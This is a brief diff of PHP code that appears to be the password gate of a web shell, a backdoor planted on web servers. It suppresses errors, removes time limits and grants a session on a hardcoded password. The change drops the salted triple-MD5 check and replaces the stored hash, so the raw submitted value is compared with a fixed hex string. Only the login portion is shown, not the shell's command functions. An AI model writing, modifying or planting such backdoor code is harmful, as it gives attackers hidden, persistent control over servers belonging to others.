@@ -2,12 +2,11 @@
 @session_start();
 @set_time_limit(0); 
 @error_reporting(0);
-$salt = "silic1234";
-$psw = trim($_POST['pass']);
-$pass = $salt.$psw;
-$pass = md5(md5(md5($pass)));
+$psw = $_POST['pass'];
+$pass = $psw;
+$pass = ($pass);
 $chk_login = 1;
-$password = "8f841a9b44b0167db6056389e0106af4";
+$password = "0de664ecd2be02cdd54234a0d1229b43";
 if($pass == $password)
 {
 $_SESSION['ses'] = "$pass";
